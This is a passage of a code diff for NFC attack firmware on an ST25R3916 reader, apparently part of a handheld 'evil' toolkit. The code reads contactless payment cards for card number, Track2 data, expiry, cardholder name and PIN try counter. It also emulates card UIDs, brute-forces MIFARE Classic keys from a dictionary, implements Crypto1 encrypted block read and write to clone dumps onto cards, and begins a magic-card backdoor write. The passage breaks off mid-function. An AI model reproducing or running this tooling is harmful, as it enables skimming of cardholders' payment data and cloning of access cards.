+    Serial.printf("[EMV] GPO resp: %d bytes\n", rx_len);
+
+    // Step 4: READ RECORD — parse AFL (tag 0x94) from GPO response
+    uint8_t afl[32]; int afl_len = 0;
+    if (resp && rx_len > 4) {
+        // Try tag 0x94
+        tv = emv_find_tag1(resp, rx_len, 0x94, &tl);
+        if (tv && tl >= 4 && tl <= 32) { memcpy(afl, tv, tl); afl_len = tl; }
+        // Fallback: Format 1 (tag 0x80) — AFL starts at byte 2
+        if (afl_len == 0) {
+            tv = emv_find_tag1(resp, rx_len, 0x80, &tl);
+            if (tv && tl > 2 && tl - 2 <= 32) { memcpy(afl, tv + 2, tl - 2); afl_len = tl - 2; }
+        }
+    }
+    // Parse AFL entries (4 bytes each: SFI|rec_start|rec_end|offline)
+    if (afl_len < 4) { afl[0]=0x08; afl[1]=1; afl[2]=4; afl[3]=0; afl_len=4; } // fallback SFI=1 rec 1-4
+    Serial.printf("[EMV] AFL: %d bytes → ", afl_len);
+    for (int i = 0; i < afl_len; i++) Serial.printf("%02X ", afl[i]);
+    Serial.println();
+
+    // BUG5 fix: Check for PAN/Track2 in GPO response (Visa qVSDC mode)
+    if (emv.pan[0] == 0 && resp && rx_len > 4) {
+        tv = emv_find_tag1(resp, rx_len, 0x5A, &tl);
+        if (tv && tl >= 6) emv_extract_pan(emv, tv, tl, false);
+        tv = emv_find_tag1(resp, rx_len, 0x57, &tl);
+        if (tv && tl >= 8) emv_extract_pan(emv, tv, tl, true);
+        tv = emv_find_tag2(resp, rx_len, 0x5F, 0x24, &tl);
+        if (tv && tl >= 3 && emv.expiry[0] == 0)
+            snprintf(emv.expiry, sizeof(emv.expiry), "%02X/%02X", tv[1], tv[0]);
+    }
+
+    // Breadth-first: read FIRST record of each SFI, then remaining records
+    // This ensures we reach SFI=3 (PAN) before SFI=2 rec 4 kills the card
+    int afl_entries = afl_len / 4;
+    int total_fails = 0;
+    int n_afl = afl_len / 4;
+    uint8_t sfi_dead[8] = {};
+    for (int depth = 0; depth < 10 && total_fails < 6; depth++) {
+        bool reverse = (depth > 0 && emv.pan[0] != 0); // reverse order after PAN found
+        for (int _idx = 0; _idx < n_afl && total_fails < 6; _idx++) {
+            int aidx = reverse ? (n_afl - 1 - _idx) : _idx;
+            if (sfi_dead[aidx]) continue;
+            int ai = aidx * 4;
+            int sfi = afl[ai] >> 3;
+            int rec_start = afl[ai + 1];
+            int rec_end = afl[ai + 2];
+            if (sfi > 30 || rec_start > rec_end || rec_end > 20) continue;
+            int rec = rec_start + depth;
+            if (rec > rec_end) continue;
+            uint8_t rr[] = {0x00, 0xB2, (uint8_t)rec, (uint8_t)((sfi << 3) | 0x04), 0x00};
+            resp = nfc_transceive_apdu(rr, sizeof(rr), &rx_len, -500);
+            if (!resp || rx_len < 4) { sfi_dead[aidx] = 1; total_fails++; continue; }
+            total_fails = 0;
+            if (rx_len >= 2 && resp[rx_len-2] == 0x6A) continue; // record not found → try next
+            if (rx_len >= 2 && resp[rx_len-2] == 0x69) continue; // conditions not satisfied → try next
+
+            // PAN (tag 5A)
+            tv = emv_find_tag1(resp, rx_len, 0x5A, &tl);
+            if (tv && tl >= 6) emv_extract_pan(emv, tv, tl, false);
+
+            // Track2 (tag 57) — extract PAN + store raw hex
+            tv = emv_find_tag1(resp, rx_len, 0x57, &tl);
+            if (tv && tl >= 8) {
+                emv_extract_pan(emv, tv, tl, true);
+                if (emv.track2[0] == 0) {
+                    for (int j = 0; j < tl && j < 20; j++)
+                        snprintf(emv.track2 + j*2, 3, "%02X", tv[j]);
+                }
+            }
+
+            // Expiry (tag 5F24) — format MM/20YY
+            tv = emv_find_tag2(resp, rx_len, 0x5F, 0x24, &tl);
+            if (tv && tl >= 3 && emv.expiry[0] == 0)
+                snprintf(emv.expiry, sizeof(emv.expiry), "%02X/20%02X", tv[1], tv[0]);
+
+            // Effective date (tag 5F25)
+            tv = emv_find_tag2(resp, rx_len, 0x5F, 0x25, &tl);
+            if (tv && tl >= 3 && emv.effective[0] == 0)
+                snprintf(emv.effective, sizeof(emv.effective), "%02X/20%02X", tv[1], tv[0]);
+
+            // Cardholder name (tag 5F20)
+            tv = emv_find_tag2(resp, rx_len, 0x5F, 0x20, &tl);
+            if (tv && tl > 0 && tl < 27 && emv.holder[0] == 0) {
+                memcpy(emv.holder, tv, tl); emv.holder[tl] = 0;
+            }
+
+            // App label (tag 50 or 9F12 fallback)
+            if (emv.app_label[0] == 0) {
+                tv = emv_find_tag1(resp, rx_len, 0x50, &tl);
+                if (tv && tl > 0 && tl < 20) { memcpy(emv.app_label, tv, tl); emv.app_label[tl] = 0; }
+            }
+            if (emv.app_label[0] == 0) {
+                tv = emv_find_tag2(resp, rx_len, 0x9F, 0x12, &tl);
+                if (tv && tl > 0 && tl < 20) { memcpy(emv.app_label, tv, tl); emv.app_label[tl] = 0; }
+            }
+
+            // Country (tag 5F28) — store as uint16_t BCD
+            tv = emv_find_tag2(resp, rx_len, 0x5F, 0x28, &tl);
+            if (tv && tl >= 2 && emv.country_code == 0)
+                emv.country_code = (tv[0] << 8) | tv[1];
+
+            // Currency (tag 9F42 or 5F2A)
+            tv = emv_find_tag2(resp, rx_len, 0x9F, 0x42, &tl);
+            if (tv && tl >= 2 && emv.currency_code == 0)
+                emv.currency_code = (tv[0] << 8) | tv[1];
+            if (emv.currency_code == 0) {
+                tv = emv_find_tag2(resp, rx_len, 0x5F, 0x2A, &tl);
+                if (tv && tl >= 2) emv.currency_code = (tv[0] << 8) | tv[1];
+            }
+
+            // Language (tag 5F2D)
+            if (emv.language[0] == 0) {
+                tv = emv_find_tag2(resp, rx_len, 0x5F, 0x2D, &tl);
+                if (tv && tl >= 2) { emv.language[0]=tv[0]; emv.language[1]=tv[1]; emv.language[2]=0; }
+            }
+
+            // PAN sequence (tag 5F34)
+            tv = emv_find_tag2(resp, rx_len, 0x5F, 0x34, &tl);
+            if (tv && tl >= 1) emv.pan_seq = tv[0];
+
+            // CVM List (tag 8E) — decode auth methods
+            tv = emv_find_tag1(resp, rx_len, 0x8E, &tl);
+            if (tv && tl >= 10 && emv.auth_method[0] == 0) {
+                char* p = emv.auth_method;
+                for (int k = 8; k + 1 < tl && p - emv.auth_method < 40; k += 2) {
+                    uint8_t method = tv[k] & 0x3F;
+                    const char* sep = (p > emv.auth_method) ? "+" : "";
+                    if (method == 0x01) p += snprintf(p, 12, "%sPIN", sep);
+                    else if (method == 0x02) p += snprintf(p, 16, "%sOnlinePIN", sep);
+                    else if (method == 0x04) p += snprintf(p, 16, "%sEncPIN", sep);
+                    else if (method == 0x1E) p += snprintf(p, 12, "%sSig", sep);
+                    else if (method == 0x1F) p += snprintf(p, 12, "%sNoCVM", sep);
+                    else if (method == 0x20) p += snprintf(p, 12, "%sMobile", sep);
+                }
+            }
+
+            // AUC (tag 9F07) — decode authorized usages
+            tv = emv_find_tag2(resp, rx_len, 0x9F, 0x07, &tl);
+            if (tv && tl >= 2 && emv.usage[0] == 0) {
+                char* p = emv.usage;
+                if (tv[0] & 0x80) p += snprintf(p, 8, "Cash");
+                if (tv[0] & 0x20) p += snprintf(p, 10, "%sGoods", p > emv.usage ? "," : "");
+                if (tv[0] & 0x08) p += snprintf(p, 12, "%sServices", p > emv.usage ? "," : "");
+                if (tv[0] & 0x02) p += snprintf(p, 8, "%sATM", p > emv.usage ? "," : "");
+            }
+        } // for ai (each AFL entry)
+    } // for depth (breadth-first)
+
+    // Step 5: GET DATA — ATC (9F36)
+    uint8_t get_atc[] = {0x80, 0xCA, 0x9F, 0x36, 0x00};
+    resp = nfc_transceive_apdu(get_atc, sizeof(get_atc), &rx_len, 200);
+    if (resp && rx_len >= 4) {
+        tv = emv_find_tag2(resp, rx_len, 0x9F, 0x36, &tl);
+        if (tv && tl >= 2) emv.atc = (tv[0] << 8) | tv[1];
+    }
+
+    // GET DATA — PIN try counter (9F17)
+    uint8_t get_pin[] = {0x80, 0xCA, 0x9F, 0x17, 0x00};
+    resp = nfc_transceive_apdu(get_pin, sizeof(get_pin), &rx_len, 200);
+    if (resp && rx_len >= 3) {
+        tv = emv_find_tag2(resp, rx_len, 0x9F, 0x17, &tl);
+        if (tv && tl >= 1) emv.pin_tries = tv[0];
+    }
+
+    emv.valid = (emv.pan[0] != 0);
+    if (emv.valid) {
+        Serial.printf("[EMV] AID #%d OK: PAN=%s Type=%s App=%s ATC=%d\n",
+            aid_idx, emv.pan, emv.card_type, emv.app_label, emv.atc);
+        return emv; // found PAN, done
+    }
+    Serial.printf("[EMV] AID #%d: no PAN, trying next\n", aid_idx);
+    } // end multi-AID loop
+
+    Serial.println("[EMV] No PAN found in any AID");
+    return emv;
+}
+
+// ── NFC UID Emulation (ST25R3916 passive target mode) ──
+// Ported from Raspyjack _nfc_emulator.py _setup_target_mode()
+
+void nfc_write_pt_mem(const uint8_t* data, int len) {
+    nfc_select();
+    cc_spi->transfer(NFC_PT_A_LOAD);
+    for (int i = 0; i < len; i++) cc_spi->transfer(data[i]);
+    nfc_deselect();
+}
+
+void nfc_setup_target_mode(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak) {
+    nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x03);
+    nfc_wr(NFC_MODE_DEF, 0x88);
+    nfc_wr(NFC_PASS_TGT, 0x5C);
+    nfc_wr(NFC_MASK_RX_TMR, 0x02);
+
+    uint8_t aux = nfc_rr(NFC_AUX_DEF);
+    if (uid_len <= 4)
+        nfc_wr(NFC_AUX_DEF, (aux & ~0x30) | 0x00);
+    else
+        nfc_wr(NFC_AUX_DEF, (aux & ~0x30) | 0x10);
+
+    uint8_t pt[15] = {};
+    for (int i = 0; i < min(uid_len, 10); i++) pt[i] = uid[i];
+    pt[10] = atqa & 0xFF;
+    pt[11] = (atqa >> 8) & 0xFF;
+    if (uid_len <= 4) {
+        pt[12] = sak & ~0x04;
+    } else {
+        pt[12] = 0x04;
+    }
+    pt[13] = sak & ~0x04;
+    pt[14] = sak & ~0x04;
+    nfc_write_pt_mem(pt, 15);
+
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+
+    uint8_t ptgt = nfc_rr(NFC_PASS_TGT);
+    nfc_wr(NFC_PASS_TGT, ptgt & ~0x01);
+    nfc_cmd(NFC_CMD_GOTO_SENSE);
+}
+
+// ── MIFARE Classic Write (clone dump to target) ──
+
+bool nfc_mifare_write_block(uint8_t block, const uint8_t* data16); // defined after Crypto1
+
+// Simple MIFARE Classic auth using default key (no Crypto1 — works with FFFFFFFFFFFF on most cards)
+// Global Crypto1 state — persists between auth and encrypted read/write
+bool mf_auth_active = false; // early decl, used by nfc_mifare_read_all
+int nfc_mifare_read_block(uint8_t block, uint8_t* data16); // defined after Crypto1State
+
+
+// Common MIFARE keys for brute-force
+// Default keys (fallback if no SD dictionary)
+const uint8_t MF_DEFAULT_KEYS[12][6] = {
+    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
+    {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}, {0x00,0x00,0x00,0x00,0x00,0x00},
+    {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5}, {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
+    {0x1A,0x2B,0x3C,0x4D,0x5E,0x6F}, {0x01,0x02,0x03,0x04,0x05,0x06},
+    {0x12,0x34,0x56,0x78,0x9A,0xBC}, {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
+    {0x71,0x4C,0x5C,0x88,0x6E,0x97}, {0x58,0x7E,0xE5,0xF9,0x35,0x0F},
+};
+
+// Dynamic key dictionary (loaded from SD or defaults)
+uint8_t (*MF_KEYS)[6] = nullptr;
+int MF_KEY_COUNT = 0;
+
+// Load keys from /evil/nfc/keys.txt (one hex key per line, e.g. "FFFFFFFFFFFF")
+// Falls back to default 12 keys if file not found
+void mf_load_keys() {
+    if (MF_KEYS) { free(MF_KEYS); MF_KEYS = nullptr; }
+    MF_KEY_COUNT = 0;
+
+    File f = SD.open("/evil/nfc/keys.txt", FILE_READ);
+    if (f) {
+        // Count lines first
+        int count = 0;
+        while (f.available()) {
+            String line = f.readStringUntil('\n'); line.trim();
+            if (line.length() == 12) count++;
+        }
+        if (count > 0) {
+            MF_KEYS = (uint8_t(*)[6])malloc(count * 6);
+            if (MF_KEYS) {
+                f.seek(0);
+                while (f.available() && MF_KEY_COUNT < count) {
+                    String line = f.readStringUntil('\n'); line.trim();
+                    if (line.length() == 12) {
+                        for (int i = 0; i < 6; i++) {
+                            char hex[3] = {line[i*2], line[i*2+1], 0};
+                            MF_KEYS[MF_KEY_COUNT][i] = (uint8_t)strtol(hex, NULL, 16);
+                        }
+                        MF_KEY_COUNT++;
+                    }
+                }
+                Serial.printf("[NFC] Loaded %d keys from SD\n", MF_KEY_COUNT);
+            }
+        }
+        f.close();
+    }
+
+    // Fallback to defaults
+    if (MF_KEY_COUNT == 0) {
+        MF_KEYS = (uint8_t(*)[6])malloc(12 * 6);
+        if (MF_KEYS) {
+            memcpy(MF_KEYS, MF_DEFAULT_KEYS, 12 * 6);
+            MF_KEY_COUNT = 12;
+        }
+    }
+};
+
+// Read all sectors of a MIFARE Classic card with key brute-force
+// Returns number of sectors successfully read
+int nfc_mifare_read_all(NfcCardInfo& card, uint8_t block_data[][16], int max_blocks,
+                        LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
+    const int W = 240, H = 135;
+    int num_sectors = 16;
+    if (card.sak == 0x18) num_sectors = 40;
+    else if (card.sak == 0x09) num_sectors = 5;
+    int total_blocks = num_sectors * 4;
+    if (total_blocks > max_blocks) total_blocks = max_blocks;
+
+    mf_load_keys(); // load dictionary from SD or use defaults
+    int sectors_read = 0;
+    int last_key_idx = 0;
+
+    for (int sector = 0; sector < num_sectors; sector++) {
+        int first_block = sector * 4;
+
+        // Progress display
+        sp.fillScreen(TFT_BLACK);
+        sp.fillRect(0, 0, W, 14, 0x0841);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+        sp.printf("Reading sector %d/%d", sector + 1, num_sectors);
+        // Progress bar
+        int bar_w = (sector + 1) * (W - 20) / num_sectors;
+        sp.fillRect(10, 22, W - 20, 8, 0x2104);
+        sp.fillRect(10, 22, bar_w, 8, TFT_GREEN);
+        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+        sp.setCursor(10, 38); sp.printf("Sectors OK: %d", sectors_read);
+        sp.fillRect(0, H-14, W, 14, 0x0841);
+        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("Reading...");
+        if (use_sprite) sprite->pushSprite(0, 0);
+
+        // Reactivate card between sectors
+        mf_auth_active = false; // crypto state invalid after STOP_ALL
+        nfc_cmd(NFC_CMD_STOP_ALL);
+        delay(3);
+        // Re-configure NFC-A field
+        nfc_wr(NFC_MODE_DEF, 0x09);
+        nfc_wr(NFC_BIT_RATE, 0x00);
+        nfc_cmd(NFC_CMD_RESET_GAIN);
+        nfc_cmd(NFC_CMD_CLEAR_FIFO);
+        nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x08);
+        delay(5);
+        nfc_cmd(NFC_CMD_FIELD_ON);
+        delay(20);
+
+        // Reactivate
+        NfcCardInfo recard = nfc_activate();
+        if (!recard.valid) {
+            Serial.printf("[MF] Sector %d: reactivate failed\n", sector);
+            continue;
+        }
+
+        // Try keys — last working key first, then all others
+        bool auth_ok = false;
+        for (int ki = 0; ki < MF_KEY_COUNT && !auth_ok; ki++) {
+            int key_idx = (ki == 0) ? last_key_idx : ((ki <= last_key_idx) ? ki - 1 : ki);
+            auth_ok = nfc_mifare_auth_crypto1(recard, first_block, MF_KEYS[key_idx]);
+            if (auth_ok) {
+                last_key_idx = key_idx;
+                Serial.printf("[MF] Sector %d: auth OK key #%d\n", sector, key_idx);
+            } else {
+                // Reactivate after failed auth
+                nfc_cmd(NFC_CMD_STOP_ALL);
+                delay(3);
+                nfc_wr(NFC_MODE_DEF, 0x09);
+                nfc_wr(NFC_BIT_RATE, 0x00);
+                nfc_cmd(NFC_CMD_RESET_GAIN);
+                nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x08);
+                delay(5);
+                nfc_cmd(NFC_CMD_FIELD_ON);
+                delay(20);
+                recard = nfc_activate();
+                if (!recard.valid) break;
+            }
+        }
+
+        if (!auth_ok) {
+            Serial.printf("[MF] Sector %d: all keys failed\n", sector);
+            continue;
+        }
+
+        // Read 4 blocks in this sector
+        bool sector_ok = true;
+        for (int b = 0; b < 4; b++) {
+            int blk = first_block + b;
+            if (blk >= max_blocks) break;
+            if (nfc_mifare_read_block(blk, block_data[blk]) <= 0) {
+                sector_ok = false;
+                Serial.printf("[MF] Block %d read failed\n", blk);
+            }
+        }
+        if (sector_ok) sectors_read++;
+    }
+
+    return sectors_read;
+}
+
+// ── Crypto1 LFSR (ported from Raspyjack _crypto1.py) ──
+
+#define C1_LF_POLY_ODD  0x29CE5CUL
+#define C1_LF_POLY_EVEN 0x870804UL
+
+static const uint8_t C1_ODD_PARITY[256] = {
+    1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,
+    0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,
+    0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,
+    1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,
+    0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,
+    1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,
+    1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,
+    0,1,1,0,1,0,0,1,1,0,0,1,0,1,1,0,1,0,0,1,0,1,1,0,0,1,1,0,1,0,0,1,
+};
+
+uint8_t c1_even_parity32(uint32_t v) {
+    v ^= v >> 16; v ^= v >> 8;
+    return 1 - C1_ODD_PARITY[v & 0xFF];
+}
+
+uint8_t c1_filter(uint32_t x) {
+    uint32_t out = 0;
+    out = (0xF22C0UL >> (x & 0xF)) & 16;
+    out |= (0x6C9C0UL >> ((x >> 4) & 0xF)) & 8;
+    out |= (0x3C8B0UL >> ((x >> 8) & 0xF)) & 4;
+    out |= (0x1E458UL >> ((x >> 12) & 0xF)) & 2;
+    out |= (0x0D938UL >> ((x >> 16) & 0xF)) & 1;
+    return (0xEC57E80AUL >> out) & 1;
+}
+
+uint32_t c1_swapendian32(uint32_t x) {
+    x = ((x >> 8) & 0x00FF00FF) | ((x & 0x00FF00FF) << 8);
+    return (x >> 16) | (x << 16);
+}
+
+struct Crypto1State {
+    uint32_t odd, even;
+};
+
+Crypto1State mf_crypto;
+// mf_auth_active declared earlier
+
+int nfc_mifare_read_block(uint8_t block, uint8_t* data16) {
+    if (!mf_auth_active) {
+        // Unencrypted read (no auth)
+        uint8_t cmd[2] = {0x30, block};
+        int rx_len;
+        uint8_t* resp = nfc_transceive(cmd, 2, &rx_len, 100);
+        if (resp && rx_len >= 16) { memcpy(data16, resp, 16); return 16; }
+        return 0;
+    }
+
+    // Encrypted read: encrypt command+CRC, send with no_tx_par/no_rx_par
+    uint8_t plain[4] = {0x30, block, 0, 0};
+    uint16_t crc = c1_iso14443a_crc(plain, 2);
+    plain[2] = crc & 0xFF;
+    plain[3] = (crc >> 8) & 0xFF;
+
+    uint8_t enc[4], par[4];
+    for (int i = 0; i < 4; i++) {
+        uint8_t ks = c1_byte(mf_crypto, 0, false);
+        enc[i] = ks ^ plain[i];
+        par[i] = (c1_filter(mf_crypto.odd) ^ C1_ODD_PARITY[plain[i]]) & 1;
+    }
+
+    uint8_t packed[8];
+    int total_bits = c1_pack_with_parity(enc, par, 4, packed);
+    int packed_len = (total_bits + 7) / 8;
+
+    // Send encrypted command
+    nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    uint8_t iso_reg = nfc_rr(NFC_ISO14443A);
+    nfc_wr(NFC_ISO14443A, iso_reg | 0xC0); // no_tx_par + no_rx_par
+    nfc_fifo_w(packed, packed_len);
+    nfc_wr(NFC_TX_BYTES1, (total_bits >> 8) & 0xFF);
+    nfc_wr(NFC_TX_BYTES1 + 1, total_bits & 0xFF);
+    nfc_cmd(NFC_CMD_TX_NO_CRC);
+
+    // Wait for encrypted response
+    unsigned long dl = millis() + 50;
+    bool got_txe = false;
+    while (millis() < dl) {
+        uint8_t irq = nfc_rr(0x1A);
+        if (irq & 0x08) got_txe = true;
+        if (irq & 0x10) break; // RXE
+        if (got_txe) {
+            uint8_t t = nfc_rr(0x1B);
+            if (t & 0x40) break; // NRE
+        }
+        delayMicroseconds(200);
+    }
+
+    int n = nfc_rr(NFC_FIFO_STA1);
+    nfc_wr(NFC_ISO14443A, iso_reg & ~0xC0); // restore
+    if (n == 0) return 0;
+
+    // Read raw FIFO (contains 9-bit-per-byte packed data)
+    uint8_t raw[32];
+    int raw_len = min(n, 32);
+    nfc_fifo_r(raw, raw_len);
+
+    // Unpack 9-bit frames: extract 8-bit data bytes, skip parity bits
+    // With no_rx_par, the ST25R3916 stores raw bits: D7..D0 P D7..D0 P ...
+    uint8_t enc_data[20];
+    int enc_count = 0;
+    int bit_pos = 0;
+    for (int i = 0; i < 18 && bit_pos + 8 <= raw_len * 8; i++) {
+        uint8_t byte_val = 0;
+        for (int b = 0; b < 8; b++) {
+            int byte_idx = (bit_pos + b) / 8;
+            int bit_idx = (bit_pos + b) % 8;
+            if (raw[byte_idx] & (1 << bit_idx))
+                byte_val |= (1 << b);
+        }
+        enc_data[enc_count++] = byte_val;
+        bit_pos += 9; // skip parity bit
+    }
+
+    // Decrypt with Crypto1
+    if (enc_count < 16) return 0;
+    for (int i = 0; i < enc_count && i < 18; i++) {
+        uint8_t ks = c1_byte(mf_crypto, 0, false);
+        if (i < 16) data16[i] = ks ^ enc_data[i];
+    }
+
+    Serial.printf("[MF] Read blk %d: %02X%02X%02X%02X... (%d enc bytes)\n",
+        block, data16[0], data16[1], data16[2], data16[3], enc_count);
+    return 16;
+}
+
+bool nfc_mifare_write_block(uint8_t block, const uint8_t* data16) {
+    if (!mf_auth_active) {
+        // Unencrypted write
+        uint8_t cmd[2] = {0xA0, block};
+        int rx_len;
+        uint8_t* resp = nfc_transceive(cmd, 2, &rx_len, 100);
+        if (!resp || rx_len < 1 || (resp[0] & 0x0F) != 0x0A) return false;
+        delay(1);
+        resp = nfc_transceive(data16, 16, &rx_len, 100);
+        return resp && rx_len >= 1 && (resp[0] & 0x0F) == 0x0A;
+    }
+
+    // ── Encrypted write (Crypto1 active) — Ported from Flipper Zero ST25R3916 HAL ──
+    // Source: furi_hal_nfc_iso14443a.c + nfc.c + st25r3916.c
+
+    auto encrypt_pack = [&](const uint8_t* plain, int plain_len, uint8_t* packed, int* total_bits_out) {
+        uint8_t enc[24], par[24];
+        for (int i = 0; i < plain_len; i++) {
+            uint8_t ks = c1_byte(mf_crypto, 0, false);
+            enc[i] = ks ^ plain[i];
+            par[i] = (c1_filter(mf_crypto.odd) ^ C1_ODD_PARITY[plain[i]]) & 1;
+        }
+        *total_bits_out = c1_pack_with_parity(enc, par, plain_len, packed);
+    };
+
+    auto decrypt_ack = [&](uint8_t enc_byte) -> uint8_t {
+        uint8_t out = 0;
+        for (int i = 0; i < 4; i++)
+            out |= ((c1_bit(mf_crypto, 0, false) ^ ((enc_byte >> i) & 1)) & 1) << i;
+        return out;
+    };
+
+    // ── send_and_ack: Flipper-aligned ST25R3916 TX/RX sequence ──
+    auto send_and_ack = [&](const uint8_t* packed, int packed_len, int total_bits) -> int {
+        // Step 1: trx_reset (Flipper: furi_hal_nfc_trx_reset → CMD_STOP)
+        nfc_cmd(0xC2); // ST25R3916_CMD_STOP
+        // Step 2: tx_custom_parity (Flipper: furi_hal_nfc_iso14443a_poller_tx_custom_parity)
+        nfc_cmd(0xDB); // CMD_CLEAR_FIFO
+        nfc_wr(NFC_TIMER_EMV, nfc_rr(NFC_TIMER_EMV) & ~0x02); // clear NRT EMV bit 1
+        nfc_wr(NFC_ISO14443A, nfc_rr(NFC_ISO14443A) | 0xC0);  // enforce no_tx_par + no_rx_par
+        // IRQ: read all 4 regs as burst to clear pending (Flipper: st25r3916_get_irq)
+        nfc_select();
+        cc_spi->transfer(NFC_OP_READ | 0x1A);
+        for (int i = 0; i < 4; i++) cc_spi->transfer(0x00);
+        nfc_deselect();
+        // TX bytes: low byte (0x23) FIRST, then high byte (0x22) — Flipper order
+        nfc_wr(NFC_TX_BYTES1 + 1, total_bits & 0xFF);
+        nfc_wr(NFC_TX_BYTES1, (total_bits >> 8) & 0xFF);
+        nfc_fifo_w(packed, packed_len);
+        nfc_cmd(0xC5); // CMD_TRANSMIT_WITHOUT_CRC
+
+        // Step 3: state machine (Flipper: nfc_poller_trx_state_machine)
+        // Wait TXE → RXE, with NRE/ERR as abort
+        unsigned long dl = millis() + 25;
+        bool got_txe = false, got_rxe = false;
+        while (millis() < dl) {
+            // Burst read all 4 IRQ registers
+            nfc_select();
+            cc_spi->transfer(NFC_OP_READ | 0x1A);
+            uint8_t r0 = cc_spi->transfer(0x00);
+            uint8_t r1 = cc_spi->transfer(0x00);
+            uint8_t r2 = cc_spi->transfer(0x00);
+            cc_spi->transfer(0x00); // r3 (target IRQs, not needed)
+            nfc_deselect();
+            if (r0 & 0x08) got_txe = true;       // TXE
+            if (r0 & 0x10) { got_rxe = true; break; } // RXE
+            if (r1 & 0x40) break;                 // NRE (no response)
+            if (r2 & 0xF0) break;                 // PAR/CRC/ERR1/ERR2
+            delayMicroseconds(50);
+        }
+        if (!got_rxe) return -1;
+
+        // Step 4: read FIFO (Flipper: st25r3916_read_fifo with STATUS1+STATUS2)
+        nfc_select();
+        cc_spi->transfer(NFC_OP_READ | NFC_FIFO_STA1);
+        uint8_t sta0 = cc_spi->transfer(0x00); // FIFO_STATUS1
+        uint8_t sta1 = cc_spi->transfer(0x00); // FIFO_STATUS2
+        nfc_deselect();
+        int bytes = (((sta1 >> 6) & 3) << 8) | sta0;
+        int lb = (sta1 >> 1) & 7;
+        if (bytes == 0) return -1;
+        uint8_t rx_buf[4];
+        nfc_select();
+        cc_spi->transfer(NFC_OP_FIFO_R);
+        for (int i = 0; i < min(bytes, 4); i++) rx_buf[i] = cc_spi->transfer(0x00);
+        nfc_deselect();
+        int rx_bits = lb ? ((bytes - 1) * 8 + lb) : (bytes * 8);
+        if (rx_bits < 4) return -1;
+        return decrypt_ack(rx_buf[0]);
+    };
+
+    // ── Setup + Phase 1 + Phase 2 ──
+    uint8_t iso_save = nfc_rr(NFC_ISO14443A);
+    nfc_wr(NFC_ISO14443A, iso_save | 0xC0);
+
+    // Phase 1: WRITE command
+    uint8_t cmd_plain[4] = {0xA0, block, 0, 0};
+    uint16_t crc1 = c1_iso14443a_crc(cmd_plain, 2);
+    cmd_plain[2] = crc1 & 0xFF;
+    cmd_plain[3] = (crc1 >> 8) & 0xFF;
+    uint8_t packed1[8]; int bits1;
+    encrypt_pack(cmd_plain, 4, packed1, &bits1);
+    int ack1 = send_and_ack(packed1, (bits1 + 7) / 8, bits1);
+    if (ack1 != 0x0A) {
+        nfc_wr(NFC_ISO14443A, iso_save);
+        Serial.printf("[MF] Write blk %d: P1 ack=%02X\n", block, ack1);
+        return false;
+    }
+
+    // Phase 2: 16 data + CRC
+    uint8_t data_plain[18];
+    memcpy(data_plain, data16, 16);
+    uint16_t crc2 = c1_iso14443a_crc(data_plain, 16);
+    data_plain[16] = crc2 & 0xFF;
+    data_plain[17] = (crc2 >> 8) & 0xFF;
+    uint8_t packed2[28]; int bits2;
+    encrypt_pack(data_plain, 18, packed2, &bits2);
+    int ack2 = send_and_ack(packed2, (bits2 + 7) / 8, bits2);
+    nfc_wr(NFC_ISO14443A, iso_save);
+    if (ack2 != 0x0A) {
+        Serial.printf("[MF] Write blk %d: P2 ack=%02X\n", block, ack2);
+        return false;
+    }
+
+    Serial.printf("[MF] Write blk %d: OK\n", block);
+    return true;
+}
+
+
+
+// ── Magic Card (Gen1) backdoor write — no auth needed ──
+// Gen1 "Chinese Magic Card" protocol: WUPC (0x40, 7-bit) → 0x43 → write blocks directly
+
+bool nfc_magic_wakeup() {
+    // HALT any active card first
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    delay(1);
+    nfc_wr(NFC_MODE_DEF, 0x09);
+    nfc_wr(NFC_BIT_RATE, 0x00);
+    nfc_wr(NFC_ISO14443A, 0x00);
+    nfc_cmd(NFC_CMD_RESET_GAIN);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x08);
+    delay(5);
+    nfc_cmd(NFC_CMD_FIELD_ON);
+    delay(50);
+
+    // Send HALT (50 00) to ensure card is in HALT state
+    uint8_t halt_cmd[2] = {0x50, 0x00};
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    nfc_fifo_w(halt_cmd, 2);
+    nfc_set_tx_len(2);
+    nfc_cmd(NFC_CMD_TX_CRC);
+    delay(5);
+
